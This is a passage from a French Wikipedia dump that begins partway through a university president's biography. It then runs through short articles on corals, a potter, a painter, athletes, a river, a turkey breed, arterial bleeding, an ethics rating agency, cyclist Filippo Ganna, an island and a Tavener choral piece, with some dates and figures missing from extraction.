Il est membre du conseil d’administration de la COmUe Université Paris-Est depuis 2007, ainsi que du conseil scientifique de l’École nationale des ponts et chaussées depuis 2008. 
Depuis 2013, il est président de la Conférence des présidents d'université d’Ile-de-France.
En , Luc Hittinger, président de l'UPEC, et Gilles Roussel, président de l'Université Paris-Est-Marne-la-Vallée (UPEM), ont reçu mandat de leur conseil d'administration respectif pour travailler conjointement à la structuration de l'enseignement supérieur et de la recherche sur leur territoire. Au doit naître une nouvelle université issue de la fusion de l’UPEC et de l’UPEM.
Ce projet s'appuie sur une collaboration de plusieurs années entre les deux universités au sein de la COMUE Université Paris-Est.
Il est candidat pour un second mandat début 2016. Ses listes arrivent en tête chez les enseignants-chercheurs, mais les deux listes d'opposition s'unissent sur la candidature d'Olivier Montagne qui est élu nouveau président de l'université le .
Décorations.
Il a reçu le les insignes de chevalier dans l’ordre national de la Légion d'honneur et est chevalier dans l’ordre des Palmes académiques
Publications.
Il est l’auteur de 161 publications scientifiques référencées dans PubMed.

</doc>
<doc id="9413483" url="https://fr.wikipedia.org/wiki?curid=9413483" title="Domanialité">
Domanialité



</doc>
<doc id="9413484" url="https://fr.wikipedia.org/wiki?curid=9413484" title="Caryophyllia solida">
Caryophyllia solida

Caryophyllia solida est une espèce de coraux appartenant à la famille des Caryophylliidae.

</doc>
<doc id="9413487" url="https://fr.wikipedia.org/wiki?curid=9413487" title="Peter Stichbury">
Peter Stichbury

Peter Stichbury (Auckland, – Auckland, ) est un potier néo-zélandais.
Biographie.
Stichbury est né à Auckland en 1924. En 1957, il a été lé premier artiste à recevoir une bourse de l' (aujourd'hui ), et est parti avec sa femme Diane pour St Ives (Cornouailles) pour étudier avec Bernard Leach. De là, il est parti en Afrique, où il a été le premier étudiant occidental de à Abuja. Ces séjours outremer ont été pour lui une source d'inspiration. Stichbury a créé le département de poterie à l'. Une de ses poteries a été offerte à la reine Élisabeth II au cours de son voyage officiel en Nouvelle-Zélande en 1974.
Bien que principalement connu pour sa poterie, Stichbury a aussi fabriqué des instruments de musique (violoncelles, violons) à la fin de sa vie. Son œuvre a été exposé au Musée du mémorial de guerre d'Auckland en 2004 et au musée national Te Papa Tongarewa en 2011-2012.
En 2002, il a été fait membre du pour ses services à la poterie. Il est mort le , laissant une femme et trois enfants.

</doc>
<doc id="9413489" url="https://fr.wikipedia.org/wiki?curid=9413489" title="Michèle Martin (actrice)">
Michèle Martin (actrice)

Michèle Martin, née Suzette Poulhe-Charrière à Clermont-Ferrand le et morte à Vénissieux le est une actrice française.

</doc>
<doc id="9413493" url="https://fr.wikipedia.org/wiki?curid=9413493" title="Joan Gascó">
Joan Gascó

Joan Gascó, en espagnol Juan Gascó est un peintre espagnol du , né à Tafalla (Navarre) avant 1480 et mort à Vic (Catalogne) en 1529.
Biographie.
D'origine navarraise, il s'installe à Vic au tout début du . Des comparaisons stylistiques ont permis de le rapprocher de Pedro Díaz de Oviedo, actif à la même époque à Tudela, où il a donc peut-être également séjourné.
Il réalise plusieurs retables, dont ceux des églises Saint-Jean de Fàbregues (1503), Saint-Jean del Galí (1507), Sainte-Julie de Vilamirosa (1508) et Saint-Romain de Sau (1509). Son style est de plus en plus marqué par la Renaissance : retable de Saint-Pierre de Vilamajor, panneau de retable représentant sainte Barbe (1516), calvaire de Pruit (1521), porte de l'armoire du trésor de la cathédrale de Vic, retable de saint Barthélémy de l'hôpital de pèlerins de Vic (1525). On lui attribue également les prophètes du retable de saint Étienne protomartyr de Granollers, actuellement conservé au Musée national d'art de Catalogne (MNAC), et une Sainte Face conservée au musée épiscopal de Vic, qui montre l'influence exercée sur Joan Gascó par Bartolomé Bermejo. 
Prédelle du retable de Sainte-Lucie, Sainte-Ursule, Sainte-Christine, Sainte-Hélène et Sainte-Marguerite, conservée au musée du monastère de Sant Joan de les Abadesses
Son fils Pere Gascó (entre 1502 et 1505 - 1546) a terminé certaines de ses œuvres et repris son atelier à sa mort.

</doc>
<doc id="9413500" url="https://fr.wikipedia.org/wiki?curid=9413500" title="Blessing Ibrahim">
Blessing Ibrahim

Blessing Ibrahim (née le ) est une athlète nigériane, spécialiste du triple saut.
Biographie.
En juin 2012, elle devient championne du Nigeria de triple saut, avec .
En 2015 elle remporte l'argent lors des Jeux africains. Avec réalisés dès son premier essai, elle s'incline face à la Camerounaise Joëlle Mbumi Nkouindjin.

</doc>
<doc id="9413503" url="https://fr.wikipedia.org/wiki?curid=9413503" title="Orke">
Orke

L' est une rivière allemande, d'une longueur de qui coule dans les länder de la Rhénanie-du-Nord-Westphalie et de la Hesse. Elle est un affluent de l'Eder et donc un sous-affluent de la Weser par la Fulda.

</doc>
<doc id="9413504" url="https://fr.wikipedia.org/wiki?curid=9413504" title="Caryophyllia squiresi">
Caryophyllia squiresi

Caryophyllia squiresi est une espèce de coraux appartenant à la famille des Caryophylliidae.

</doc>
<doc id="9413505" url="https://fr.wikipedia.org/wiki?curid=9413505" title="Dindon ardoise">
Dindon ardoise

Le dindon ardoise (en anglais : "Slate Blue" ou "Blue Slate") est une race de dindon à très faible effectif originaire de et principalement élevée aux États-Unis. Elle figure cependant parmi les races reconnues par le British Poultry Standard.
Origine.
La race est reconnue par l'American Poultry Association en 1874.
Description.
Son coloris est bleu ardoise parfois pointillé de noir.
Race menacée.
En 2007, la FAO classe la race « en danger ». Depuis, les effectifs de la population restent bas. La base DAD-IS indique une population inférieure à 1500 animaux aux États-Unis en 2015.

</doc>
<doc id="9413507" url="https://fr.wikipedia.org/wiki?curid=9413507" title="Lucien Giraudo">
Lucien Giraudo

Lucien Giraudo, né le à Toulon, est spécialiste de la littérature française du XXe siècle et en particulier de l'œuvre de l'écrivain Michel Butor.
Il est professeur en Classes Préparatoires aux Grandes Ecoles. Il est aussi l'auteur de textes critiques sur les arts (peinture et musique), ainsi que de textes poétiques illustrés par des artistes.
Biographie.
En il rencontre Michel Butor à la Faculté des Lettres de Nice. Débute alors une correspondance avec l'écrivain.
En installation à Tanger (Maroc). De retour en France en , il rencontre bientôt l'universitaire Henri Mitterand qui lui confie de nombreux travaux aux éditions Nathan.
Très proche de Butor, il a accès à de nombreux livres d'artistes et travaux en collaboration peu connus du grand public.
Il soutient sa thèse en à Paris VIII ("Œuvres d'art et collaboration chez Michel Butor").
Rencontres et amitiés avec les nombreux artistes qui travaillent régulièrement en collaboration avec Michel Butor (Patrice Pouperon, Bertrand Dorny, Georges Badin, Julius Baltazar...).

</doc>
<doc id="9413508" url="https://fr.wikipedia.org/wiki?curid=9413508" title="Saignement artériel">
Saignement artériel

Un saignement artériel est une hémorragie provoquée par toute plaie d'une artère, occasionnant un jet de sang. L'intensité de ce "saignement en jet", rythmé par les battements cardiaques, dépend de la pression artérielle et de la taille de la plaie. La quantité de sang perdue peut être importante très rapidement, et ainsi conduire à une mort rapide. L'arrêt de l'hémorragie, en premier lieu par un point de compression, est donc impératif.
Les expressions "giclée de sang", "poussée de sang", "pulvérisation de sang", "jet de sang", "gicle artérielle" ou "artérielle jaillissante" sont rencontrées.
Mécanisme.
En coupant une artère carotide contenant de sang dans le cœur à chaque battement qui est de 65 battements par minute, une artère complètement rompu fera jaillir du sang pendant environ 30 secondes. Si l'artère est seulement entaillée, le sang jaillira plus mais sortira sous une certaine pression et sa pulvérisation sera beaucoup plus élevée. Pour éviter une ischémie de la main, il y a un test qui implique de faire gicler le sang de l'artère radiale.
En 1933, un procès pour assassinat a incité un témoignage du Clément Harrisse Arnold afin de savoir jusqu'où le sang pourrait jaillir du cou : il a été retenu que c'était de donc environ à la verticale et de donc environ à l'horizontale.
Prise en charge.
Un saignement artériel, comme tout saignement, menace le pronostic vital, il est donc nécessaire de l'arrêter. Dans l'immédiat, la prise en charge simple consiste à assurer un point de compression au niveau du saignement. Rapidement, une prise en charge chirurgicale est à envisager en fonction de la gravité des lésions.
Animaux.
Certains animaux autohaemorrhages se défendent en faisant gicler délibérément leur propre sang. Les grillons blindés, qui sont originaires de Namibie, d'Afrique du Sud et du Botswana, ont une façon unique de chasser les prédateurs : ils crachent du vomi et du sang. les sauterelles font de même que les grillons blindés d’où leurs surnom de "Blutspritzer" en Allemagne. Le lézard à cornes, aussi, utilise la tactique du cracha de sang à partir d'une poche près de ses yeux.
Dans la culture.
Religion.
Chinnamastâ, la décapitée, est une déesse hindoue qui est représentée en tenant sa tête dans ses mains avec trois giclement de sang provenant de son cou.
Saint Miliau, est un martyr chrétien tué vers le après Jésus-Christ, qui est parfois représenté tenant sa tête coupée, comme dans le retable de la "Passion du Christ" à Lampaul-Guimiliau, où le sang jaillit de son cou.
Dans la fiction.
Le giclement de sang est utilisé comme effet spécial dans le théâtre, dans les films d'horreur et d'action, les séries télévisées, les dessins animés, les bandes dessinées et les jeux vidéo.
Dans "Monty Python", "Sam Peckinpah's "Salad Days" (qui est une parodie), il y a une grande quantité de giclement de sang. Dans de 1975, Le Roi Arthur coupe les deux bras et les deux jambes du Chevalier noir.
Le roman de 1985, "Méridien de sang" de Cormac McCarthy, comprend une scène dans laquelle l'un des deux Jacksons décapite l'autre, conduisant à un giclement de sang décrit graphiquement par l'auteur.
Dans les films "Rape and revenge" et "Œil pour œil" d'abord publié en 1978 et réédité pour un large public en 1980, contenait plusieurs scènes sanglantes.
Le film "" de 1991 a une scène où un Klingon est abattu. Le sang qui jaillit des blessures du Klingon a été créée en utilisant l'imagerie générée par ordinateur, les animateurs devaient faire en sorte que le sang flotte d'une manière convaincante sans être trop gore. L'artiste des effets spéciaux a regardé des images de la NASA pour savoir comment faire flotter les globules d'eau pour faire de même avec des particules de sang.
Les jeux vidéo peuvent utiliser un système de particules pour créer des effets de giclées de sang. Les effets spéciaux de sang jaillissant dans "Mortal Kombat" en 1992 ont engendré des controverses qui ont servi à augmenter sa popularité.
En 2003, le film "Kill Bill" multiplie les scènes où le katana est utilisé dans les combats, entrainant de manière exagéré des giclements de sang énormes.
Dans la série télévisée de 2010, ' il y a des ' et que "".
La série télévisée Dexter est centré autour de la vie d'un spécialiste des éclaboussures de sang, nommé Dexter Morgan qui est aussi un tueur en série travaillant dans le département de la police de Miami.
Conan O'Brien a été mordu par deux kraken qui sont des monstres marins dans le film de SyFy, "Sharktopus vs. Pteracuda" de 2014 où sa tête continue à injecter de grandes quantités de sang quand il est ballotté par les joueurs de volley-ball.

</doc>
<doc id="9413511" url="https://fr.wikipedia.org/wiki?curid=9413511" title="Boletus regius">
Boletus regius



</doc>
<doc id="9413518" url="https://fr.wikipedia.org/wiki?curid=9413518" title="Standard Ethics">
Standard Ethics

Standard Ethics est une agence de notation extra-financière internationale spécialisée dans l'évaluation de type qualitatif des entreprises selon des critères sociaux et environnementaux et suivant un cahier des charges lié au développement durable, en utilisant une forme de notation spécifique et du reporting environnemental. Son siège est à Bruxelles et à Londres. Son but principal est de promouvoir l'éthique des entreprises, la responsabilité sociétale des entreprises (RSE), l'investissement socialement responsable (ISR) et le gouvernement d'entreprise selon les principes et les lignes de conduite des Nations unies (UN), de l'Organisation de coopération et de développement économiques (OCDE) ainsi que de l'Union européenne (UE).
En , Standard Ethics devient la première agence de notation sociale indépendante en Europe (RSE et gouvernement d'entreprise) après la décision de n'émettre que des notations sur demande (« sollicitées ») avec une méthodologie standard.
Standard Ethics Rating.
Le Standard Ethics rating est une notation extra-financière sollicitée (Solicited Sustainability Rating – SSR). Il s'agit d'une notation qui entend émettre un avis sur le niveau de conformité des entreprises et des pays souverains en matière de durabilité et de responsabilité sociétale des entreprises (RSE) selon la documentation et les lignes de conduite des Nations unies, de l'Organisation de coopération et de développement économiques (OCDE) ainsi que de l'Union européenne (UE). 
L'approche méthodologique de Standard Ethics remonte à 2001 en tant que département de recherche de l'Agenzia Europea d'Investimenti (AEI) Spa, une société de portefeuille active dans les investissements durables. Après une scission en 2003, elle devient une entité à part entière.
Système d'évaluation.
Depuis 2002, les évaluations finales de Standard Ethics concernant le niveau de conformité des entreprises et des nations sur la base des valeurs éthiques de référence sont exprimées au moyen de huit notes différentes: EEE; EEE-; EE+; EE; EE-; E+; E; E-.
Les nations et entreprises qui ne respectent pas les valeurs exprimées par les Nations unies ne reçoivent pas de notation; de plus, elles sont ajoutées parmi les émetteurs "suspendus".
Standard Ethics utilise un processus de notation basé sur les analystes de sorte que l'évaluation ne requiert en aucun cas de la part du requérant le remplissage de formulaires et de questionnaires ainsi qu'une documentation autre que celle déjà existante.
Indices Standard Ethics.
La publication des SER permet d'accéder à un ou plusieurs indices Standard Ethics selon la nature et la dimension de la société. En Europe, Standard Ethics a créé les indices suivants :
En ce qui concerne les rapports effectués sur ses indices, Standard Ethics se base sur la divulgation complète.
Notations nationales.
Les 44 entrées suivantes (en 2013, Standard Ethics a assigné pour la première fois une notation à l'État de la Cité du Vatican):

</doc>
<doc id="9413523" url="https://fr.wikipedia.org/wiki?curid=9413523" title="Pristimantis paquishae">
Pristimantis paquishae

Pristimantis paquishae est une espèce d'amphibiens de la famille des Craugastoridae.
Répartition.
Cette espèce est endémique de la province de Zamora-Chinchipe en Équateur. Elle se rencontre à environ d'altitude dans la cordillère du Condor.
Étymologie.
Cette espèce est nommée en l'honneur des soldats tombés en défendant "la noble cause de la patrie" lors de la guerre du Paquisha.

</doc>
<doc id="9413524" url="https://fr.wikipedia.org/wiki?curid=9413524" title="Cnearc">
Cnearc



</doc>
<doc id="9413525" url="https://fr.wikipedia.org/wiki?curid=9413525" title="Institut d'étude avancée">
Institut d'étude avancée



</doc>
<doc id="9413526" url="https://fr.wikipedia.org/wiki?curid=9413526" title="Filippo Ganna">
Filippo Ganna

Filippo Ganna, né le à Verbania (Piémont, Italie), est un coureur cycliste italien, membre de l'équipe Ineos. Il pratique deux disciplines : la piste et la route. Il est champion olympique de poursuite par équipes (2020), champion du monde de poursuite par équipes (2021), sextuple champion du monde de poursuite (2016, 2018, 2019, 2020, 2022 et 2023) et double champion du monde du contre-la-montre (2020 et 2021). Il compte également trois titres de champion d'Europe en poursuite (2017) et poursuite par équipes (2018 et 2023). 
Le , il bat le record de l'heure avec . Six jours plus tard, il bat cette fois le record du monde de poursuite sur quatre kilomètres en , record qu'il avait déjà détenu du au .
Biographie.
Filippo Ganna naît le à Verbania dans le Piémont en Italie. Il n'est pas apparenté à Luigi Ganna, vainqueur du premier Tour d'Italie. Cependant, son grand-père Ambrosio vient de la même région (la province de Varèse) que Luigi Ganna. Son père, a participé aux Jeux olympiques 1984 de Los Angeles en kayak à quatre places.
Doté d'un profil puissant - il mesure - Filippo Ganna est un spécialiste du contre-la-montre et de la poursuite.
Les débuts.
En 2012, il est membre de la Pedale Ossolano. Il devient champion d'Italie du contre-la-montre cadets et termine du Chrono des Nations-Les Herbiers-Vendée cadets. En 2013, il termine du championnat d'Italie du contre-la-montre juniors.
En 2014, sous les couleurs de l'Aspiratori Otelli Castanese Verbania, il devient champion d'Italie du contre-la-montre juniors et remporte le Trofeo Emilio Paganessi et le Chrono des Nations-Les Herbiers-Vendée juniors. Il se classe du championnat du monde du contre-la-montre juniors et du championnat d'Europe du contre-la-montre juniors. Sur piste, il remporte le titre national junior en poursuite individuelle. sur la piste. L'année suivante, il court pour l'équipe Viris Maserati-Sisal Matchpoint. Il termine du Grand Prix San Giuseppe. À partir du mois d'août, il est en stage dans l'équipe Lampre-Merida. En septembre, il remporte le Chrono champenois chez les élites.
2016 : premier titre mondial en poursuite.
En 2016, il entre dans l'équipe Colpack. Aux mondiaux sur piste 2016 à Londres, il devient champion du monde de poursuite chez les élites, à l'âge de 19 ans. En qualification, il établit un nouveau record d'Italie en 4 minutes 16,127 secondes. Après ce succès surprenant, il est célébré dans les journaux italiens comme le nouveau Francesco Moser, qui avait été titré 40 ans plus tôt, en 1976 et qui était le dernier champion du monde italien dans cette discipline. Il remporte en début de saison le Grand Prix Laguna, puis quelques mois plus tard, il termine du Trophée de la ville de San Vendemiano. Fin mai, il remporte Paris-Roubaix espoirs. La même année, il est sélectionné pour participer aux Jeux olympiques de Rio de Janeiro, où il termine sixième de la poursuite par équipes avec Simone Consonni, Liam Bertazzo et Francesco Lamon. Au mois d'octobre, il signe un contrat professionnel avec la formation Lampre-Merida, qui devient UAE Abu Dhabi en 2017.
2017-2018 : débuts professionnels et deuxième titre mondial.
Aux mondiaux sur piste 2017 à Hong Kong, Ganna obtient la médaille de bronze en poursuite par équipes avec Consonni, Bertazzo et Lamon. Il échoue à défendre son titre en poursuite individuelle, où il perd en finale face à l'Australien Jordan Kerby. En juillet, il est sélectionné pour les championnats d'Europe de cyclisme sur route. Aux championnats d'Europe sur piste d'octobre, il devient champion d'Europe de poursuite individuelle.
En 2018, il s'adjuge pour la deuxième fois le titre mondial en poursuite individuelle. Il obtient également la médaille de bronze en poursuite par équipes. Sur route, il est deuxième du Tour de San Juan et du championnat d'Italie du contre-la-montre. Sélectionné pour représenter son pays aux championnats d'Europe sur route, il se classe douzième de l'épreuve contre-la-montre.
Depuis 2019 : chez Ineos.
2019 : troisième titre mondial en poursuite et records du monde.
En 2019, il rejoint l'équipe Sky qui est renommée Ineos en cours de saison. Il remporte en février le prologue du Tour de La Provence, sa première victoire sur route chez les professionnels. En mars, il remporte son troisième titre mondial en poursuite individuelle, battant l'Allemand Domenic Weinstein en finale, comme en 2016. Au début de l'été, il s'adjuge le titre de champion d'Italie du contre-la-montre, devançant Alberto Bettiol de seulement 52 centièmes. Fin juillet, il est présélectionné pour représenter son pays aux championnats d'Europe de cyclisme sur route et prend la sixième place du contre-la-montre individuel. En fin de saison, il est médaillé de bronze du championnat du monde du contre-la-montre. Le 2 novembre 2019, lors des qualifications de la manche de Coupe du monde de Minsk, il bat le record du monde des 4 kilomètres détenu par Ashton Lambie en 4 min 5,423 secondes, améliorant de près d'une seconde le record de ce dernier. Il bat à nouveau le record en finale, en réalisant 4 min 2,647 secondes.
2020 : deux titres mondiaux et succès au Giro.
En février 2020 à Berlin, il obtient son quatrième titre de champion du monde de poursuite individuelle, établissant en qualification un nouveau record du monde en 4 minutes 1,934 secondes. Avec quatre titres mondiaux sur la discipline, il rejoint au palmarès Hugh Porter. Dans le même championnat du monde, il est également médaillé de bronze en poursuite par équipes. En avril, alors que la saison est à l'arrêt en raison de la pandémie de Covid-19, il annonce son intention d'établir un nouveau record de l'heure. Celui-ci est détenu depuis avril 2019 par Victor Campenaerts en 55,089 kilomètres. Il remporte une nouvelle fois le championnat d'Italie du contre-la-montre au mois d'aout. Il participe à Tirreno-Adriatico dont il remporte le contre-la-montre final. Il devient à Imola le premier Italien champion du monde contre-la-montre. Il prend part à son premier Tour d'Italie où il remporte quatre étapes, dont les trois contre-la-montre individuels, et porte deux jours le maillot rose de leader. En novembre, il est testé positif au COVID-19 et doit déclarer forfait pour les championnats d'Europe sur piste.
2021 : champion olympique et double champion du monde.
En mai 2021, il participe au Tour d'Italie pour la deuxième fois de sa carrière. Il remporte la première étape, un contre-la-montre individuel à Turin, et porte à nouveau le maillot rose, cette fois pendant 3 jours. Malgré une crevaison, il gagne également le contre-la-montre final à Milan, établissant un nouveau record de 5 victoires consécutives sur un contre-la-montre du Giro et battant le record de Francesco Moser. Il participe ensuite au championnat d'Italie du contre-la-montre, dans lequel il n'arrive cependant qu'à la quatrième place derrière Matteo Sobrero, Edoardo Affini et Mattia Cattaneo. 
Il est ensuite sélectionné aux Jeux olympiques de Tokyo. Sur le contre-la-montre, il termine à la cinquième place. Le 3 août, lors de la demi-finale olympique de la poursuite par équipes contre la Nouvelle-Zélande (avec Simone Consonni, Francesco Lamon et Jonathan Milan), l'équipe italienne bat le record du monde de plus de deux secondes en réalisant 3 minutes 42,307 secondes et se qualifie pour la finale. Lors de celle-ci le 4 août, le quatuor établit un nouveau record du monde en 3 minutes 42,032 secondes et décroche la médaille d'or à l'issue d'un duel serré face au Danemark, où Ganna joue un rôle majeur dans l'obtention du titre. Aux championnats d'Europe sur route, organisés à Trente, il gagne le titre européen du relais mixte avec Matteo Sobrero, Alessandro De Marchi, Elena Cecchini, Marta Cavalli et Elisa Longo Borghini. Le 9 septembre, il est vice-champion d'Europe du contre-la-montre, devancé par le Suisse Stefan Küng.
Le 19 septembre, à Bruges en Belgique, il conserve son titre de champion du monde du contre-la-montre en parcourant les 43,3 km à 53 km/h de moyenne. Il devance les locaux Wout van Aert et Remco Evenepoel. Il est également médaillé de bronze du relais mixte lors de ces mondiaux. Absent des championnats d'Europe sur piste en raison d'une chute à l'entrainement, il est ensuite pour la première fois de sa carrière champion du monde de poursuite par équipes (avec Simone Consonni, Jonathan Milan et Liam Bertazzo). Il est en revanche battu pour la première fois depuis 2017 sur la poursuite individuelle et doit se contenter du bronze après avoir rejoint le Suisse Claudio Imhof en petite finale.
2022 : record de l'heure et cinquième titre mondial en poursuite.
Il commence sa saison 2022 en remportant le contre-la-montre de l'Étoile de Bessèges-Tour du Gard. La semaine suivante, il gagne le prologue du Tour de La Provence et porte le maillot de leader pendant trois jours. Lors de la dernière étape, il est disqualifié pour avoir changé de vélo à un poste fixe et perd sa septième place au classement final.
Battu sur le contre-la-montre du Tour des Émirats arabes unis par Stefan Bissegger, il remporte la première étape chronométrée du Tirreno-Adriatico, devant Remco Evenepoel et Tadej Pogačar. En juin, il participe au Critérium du Dauphiné et remporte la quatrième étape, toujours dans le contre-la-montre, avec deux secondes d'avance sur Wout Van Aert. Il devient pour la troisième fois Champion d'Italie du contre-la-montre, puis échoue à gagner une étape du Tour de France. Il participe aux championnats d'Europe à Munich, où il termine à la troisième place du contre-la-montre, précédé des deux Suisses Stefan Bissegger et Stefan Küng. Après avoir gagné le prologue du Tour d’Allemagne, il prend part aux mondiaux sur route en Australie. Il est médaillé d'argent du contre-la-montre par équipes en relais mixte mais seulement septième du championnat du monde du contre-la-montre.
Le 8 octobre, sur le vélodrome de Granges en Suisse, il bat le record de l'heure détenu par Daniel Bigham, en le portant à . Il améliore par la même occasion la meilleure performance UCI détenue depuis 25 ans par Chris Boardman ().
Le 14 octobre, il devient vice-champion du monde de poursuite par équipes. Le lendemain, il est pour la cinquième fois champion du monde de poursuite individuelle, établissant un nouveau record du monde en 3 minutes et 59,636 secondes. Il est également devenu le deuxième poursuiteur à décrocher cinq titres dans la discipline, après son compatriote Guido Messina.
2023 : sixième titre mondial en poursuite et deuxième place à San Remo.
Lors de Milan-San Remo, Filippo Ganna fait partie d'un groupe de quatre coureurs en tête dans le dernier kilomètre de l'ascension du Poggio en compagnie de Tadej Pogačar, Wout van Aert et Mathieu van der Poel. Ce dernier se détache dans les derniers mètres de cette montée et gagne en solitaire. Ganna termine deuxième devant van Aert et Pogačar à 15 secondes du Néerlandais. Situation presque similaire à Paris-Roubaix où il fait partie du groupe de chasse de cinq hommes derrière le même Mathieu van der Poel. Il se classe à la place sur le vélodrome de Roubaix. Une infection au SARS-CoV-2 empêche Ganna de prendre le départ de la huitième étape du Tour d'Italie. 
Le 22 juillet, il remporte au sprint la étape du Tour de Wallonie à Hamoir devant son compatriote Davide Ballerini. Trois jours plus tard, il gagne la étape disputée contre-la-montre à Mons et reprend le maillot orange de leader de ce Tour qu'il conserve lors de la dernière étape. Il remporte ainsi la première course par étapes de sa carrière professionnelle.
Lors du Tour d'Espagne, il remporte la étape disputée contre-la-montre à Valladolid devançant Remco Evenepoel de 16 secondes et Primož Roglič de 36 secondes. Il se classe aussi trois fois deuxième lors des , et étapes, battu au sprint deux fois par le maillot vert Kaden Groves et une fois par Alberto Dainese. Le 11 août, il est vice-champion du monde du contre-la-montre, derrière Remco Evenepoel. 
Sur la piste, il remporte un sixième titre en poursuite individuelle et une médaille d’argent en poursuite par équipes lors des championnats du monde organisés à Glasgow durant l’été.
2024 : deux médailles olympiques et l'argent au mondial.
La saison 2024 commence avec l'objectif déclaré d'obtenir le meilleur résultat possible aux Jeux olympiques de Paris, en sacrifiant une partie de sa saison sur route. Il participe à Milan-San Remo en tant qu'équipier de Tom Pidcock et renonce à Paris-Roubaix. Par la suite, il remporte sa septième victoire d'étape au Tour d'Italie, à l'occasion de la quatorzième étape, remportant le contre-la-montre de Castiglione delle Stiviere à Desenzano del Garda.
Après le Giro, il participe fin juin aux championnats d'Italie, prenant la première place du contre-la-montre et la quatrième de la course en ligne. Sa dernière épreuve avant les Jeux olympiques est le Tour d'Autriche, où il décroche sa troisième victoire de la saison lors de la quatrième et dernière étape.
Le 27 juillet, il est médaillé d'argent du contre-la-montre des Jeux olympiques, sous la pluie, derrière Remco Evenepoel et devant Wout van Aert. Lors de la poursuite par équipes, il remporte la course pour le bronze au détriment de l'équipe danoise.
La deuxième partie de sa saison est caractérisée par des problèmes physiques, qui l'ont contraint à renoncer aux championnats d'Europe, pour ne revenir à la compétition que fin septembre à l'occasion des championnats du monde à Zurich, où il remporte la médaille d'argent sur le contre-la-montre, encore une fois derrière Evenepoel. Il est également médaillé de bronze du relais mixte. Sa saison se termine par un abandon au Gran Piemonte, suivi par le renoncement à la participation aux championnats du monde sur piste à Ballerup, alors qu'il avait toujours été médaillé depuis 2016. En fin d'année, il déclare mettre la piste de côté pour se concentrer sur sa carrière sur route.
2025.
Après un Tour de l'Algarve en demi teinte, il remporte la étape disputée en contre-la-montre de Tirreno-Adriatico à Lido di Camaiore puis conserve le maillot bleu de leader jusqu'à l'arrivée au sommet de la étape où il est dépossédé de cette tunique par Juan Ayuso malgré une bonne résistance. Il termine la "course entre deux mers" à la deuxième place à 35 secondes d'Ayuso, de bon augure pour Milan-Sanremo. Durant la Primavera, il est le seul coureur capable de suivre l'attaque de Tadej Pogačar dans la montée de la Cipressa, avec Mathieu van der Poel. Le scénario est particulier car la différence se fait plusieurs kilomètres avant la mythique montée du Poggio, lieu traditionnel pour se démarquer. Alors que Ganna est distancé dans cette dernière montée, il parvient à revenir sur ses deux compères, après la descente dans la dernière ligne droite, sur la Via Roma. Finalement, van der Poel s'impose au sprint, devant Ganna et Pogačar, avec 43 secondes d'avance sur un groupe d'une trentaine de coureurs.
Palmarès sur route.
Résultats sur les grands tours.
Tour de France.
2 participations
Tour d'Italie.
4 participations
Tour d'Espagne.
2 participations

</doc>
<doc id="9413550" url="https://fr.wikipedia.org/wiki?curid=9413550" title="(2273) Yarilo">
(2273) Yarilo

(2273) Yarilo est un astéroïde de la ceinture principale découvert par Lioudmila Tchernykh, le . Il a été nommé d'après Yarilo, le dieu de la végétation slave.

</doc>
<doc id="9413552" url="https://fr.wikipedia.org/wiki?curid=9413552" title="Île Ponui">
Île Ponui

L'île Ponui, également connue sous le nom d'île Chamberlin, est située dans le golfe de Hauraki, à l'est d'Auckland et au sud-est de l'île Waiheke, en Nouvelle-Zélande.
Situation.
Elle est localisée au sud-est de l'île Waiheke, à l'extrémité est du ’Tamaki Strait’, qui sépare l’île de la située sur la terre principale vers le sud
Géographie.
L'île a une superficie de et appartient depuis 1853 à la famille Chamberlin, qui exploite deux des trois fermes de l'île . La troisième ferme est esploitée par John Spencer et est utilisée de façon prédominante pour l’élevage des moutons.
Population.
Lors du recensement de , l'île comptait permanents, en relation avec les exploitations agricoles.
L'île est également une destination populaire pour les camps de jeunesse d'organisations telles que les scouts.
Des camps des « Croisés » (maintenant sous la bannière de la « Scripture Union » se tiennent sur l’île depuis 1932.
Faune.
Elle abrite par ailleurs une importante population de kiwis ainsi que la seule race d'âne sauvage de Nouvelle-Zélande, l'.
Naufrage.
L’île Ponui a été le siège du naufrage du navire le ‘Pupuke’ en 

</doc>
<doc id="9413553" url="https://fr.wikipedia.org/wiki?curid=9413553" title="Championnats d'Europe de badminton par équipes 2014">
Championnats d'Europe de badminton par équipes 2014

L'édition 2014 des championnats d'Europe de badminton par équipes se tient à Bâle, en Suisse du 11 au .
Compétition masculine.
Équipes participantes et groupes.
Vingt-six équipes participent à la compétition masculine et sont réparties en quatre groupes de quatre et deux groupes de cinq après tirage au sort.
Compétition féminine.
Équipes participantes et groupes.
Vingt-et-une équipes participent à la compétition féminine et sont réparties en quatre groupes de quatre et un groupe de cinq après tirage au sort.

</doc>
<doc id="9413557" url="https://fr.wikipedia.org/wiki?curid=9413557" title="The Lamb (Tavener)">
The Lamb (Tavener)

The Lamb est une courte pièce pour chœur a cappella du compositeur anglais John Tavener (1982). Il s'agit de l'une des pièces les plus interprétées de Tavener.
Texte.
Le texte utilisé est un poème de William Blake (1757-1827), "The Lamb", extrait du recueil "Songs of Innocence" (1789).
Composition et création.
John Tavener a composé cette pièce en 1982.
Structure musicale.
Il s'agit d'une pièce pour chœur a cappella à quatre voix (soprano, alto, ténor, basse). C'est une pièce courte, d'environ trois minutes et demi.
Elle est composée de vingt phrases musicales, découlant toutes de la première. Ce thème principal apparaît simplement chanté par les sopranos, puis les sopranos le rechantent avec les altos qui chantent ce thème inversé (au lieu d'avoir une tierce ascendante, les altos ont une tierce descendante). La troisième phrase (seulement avec les sopranos) combine les notes du thème principal et du thème inversé, et la quatrième phrase est tout simplement la troisième phrase écrite en rétrograde. Les phrases 5 et 6 reprennent les phrases 3 et 4 avec les altos en inversion. Les quatre phrases suivantes, une harmonisation à quatre voix de la première phrase, sont identiques, mais la quatrième est écrite en valeurs rythmiques plus longues.
Ces dix phrases sont reprises avec de nouvelles paroles et l'adjonction de doublures par les hommes.
Discographie.
Il existe plus de trente enregistrements de cette pièce.
Au cinéma.
"The Lamb" figure dans la bande originale du film de Paolo Sorrentino "La grande bellezza" sorti en 2013.

</doc>
<doc id="9413558" url="https://fr.wikipedia.org/wiki?curid=9413558" title="Caryophyllia stellula">
Caryophyllia stellula

Caryophyllia stellula est une espèce de coraux appartenant à la famille des Caryophylliidae.

</doc>
<doc id="9413561" url="https://fr.wikipedia.org/wiki?curid=9413561" title="Taylor Fritz">
Taylor Fritz

Taylor Harry Fritz, né le à Rancho Santa Fe, est un joueur de tennis américain, professionnel depuis 2015.
